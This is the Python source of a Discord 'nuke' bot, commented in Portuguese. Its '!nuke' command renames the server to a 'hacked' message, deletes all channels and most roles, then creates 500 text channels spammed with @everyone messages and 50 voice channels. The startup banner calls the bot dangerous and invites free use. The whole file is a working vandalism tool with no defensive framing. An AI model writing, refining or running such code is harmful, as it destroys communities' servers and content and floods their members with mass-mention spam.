import discord
from discord.ext import commands
import asyncio
from dotenv import load_dotenv
import os

# Carregar variáveis de ambiente do arquivo .env
load_dotenv()

# Obter o token do ambiente
TOKEN_DO_BOT = os.getenv('DISCORD_TOKEN')

# Intents necessárias
intents = discord.Intents.all()

# Defina o bot com o prefixo '!' e as intents
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Bot {bot.user} está online e pronto para o comando.')
    print('AVISO: Este bot é perigoso. Use avontade kk')
    print('------')

@bot.command(name='nuke', help='Destrói o servidor completamente.')
async def nuke(ctx):
    # Mensagem de aviso antes de começar
    await ctx.send(f"***COMANDO DE DESTRUIÇÃO RECEBIDO. INICIANDO PROTOCOLO NUKE NO SERVIDOR*** '{ctx.guild.name}'...")
    print(f"Iniciando nuke no servidor: {ctx.guild.name} (ID: {ctx.guild.id})")

    # Muda o nome do servidor
    await ctx.guild.edit(name="Server Hacked by Illuminati Team ☠️")
    print(f"Nome do servidor alterado para: Server Hacked by Illuminati Team ☠️")

    # --- PASSO 1: Deletar todos os canais ---
    print("Passo 1: Deletando todos os canais...")
    delete_channel_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_channel_tasks, return_exceptions=True)
    print("Canais deletados.")

    # --- PASSO 2: Deletar todos os cargos ---
    print("Passo 2: Deletando todos os cargos...")
    delete_role_tasks = []
    for role in ctx.guild.roles:
        # Não é possível deletar @everyone e cargos de bots/integrações, então usamos try/except
        if role.name != "@everyone" and not role.managed:
            delete_role_tasks.append(role.delete())
    await asyncio.gather(*delete_role_tasks, return_exceptions=True)
    print("Cargos deletados.")

    # --- PASSO 3 E 4: Criar novos canais e enviar spam ---
    print("Passo 3 e 4: Criando novos canais e enviando spam...")

    # Mensagem e nome para os novos canais
    spam_message = "@everyone\n# SERVER HACKED SERVER HACKED\n# SERVER HACKED SERVER HACKED\n# SERVER HACKED SERVER HACKED\n# SERVER HACKED SERVER HACKED\n# SERVER HACKED SERVER HACKED\n# SERVER HACKED SERVER HACKED\n# SERVER HACKED SERVER HACKED\n# SERVER HACKED SERVER HACKED\n# SERVER HACKED SERVER HACKED"
    text_channel_name = "#☠️-hacked-☠️"
    voice_channel_name = "☠️ HACKED ☠️"
    channel_creation_count = 500  # Quantidade de canais a serem criados

    # Cria uma lista de tarefas (criar canal e enviar spam)
    spam_tasks = []
    for i in range(channel_creation_count):
        spam_tasks.append(create_channel_and_spam(ctx.guild, f"{text_channel_name}-{i+1}", spam_message))

    # Executa todas as tarefas de criação e spam de forma concorrente
    await asyncio.gather(*spam_tasks, return_exceptions=True)

    # Cria canais de voz
    for i in range(50):  # Cria 50 canais de voz
        await ctx.guild.create_voice_channel(f"{voice_channel_name}-{i+1}")

    print("Protocolo Nuke concluído.")

async def create_channel_and_spam(guild, name, message):
    """Função auxiliar para criar um canal e encher de spam."""
    try:
        # Cria o canal
        new_channel = await guild.create_text_channel(name)
        # Envia a mensagem de spam 10 vezes no novo canal
        for _ in range(10):
            await new_channel.send(message)
    except Exception as e:
        # Imprime erros se houver (ex: rate limit)
        print(f"Erro ao criar/spamar canal '{name}': {e}")

# Inicie o bot
bot.run(TOKEN_DO_BOT)
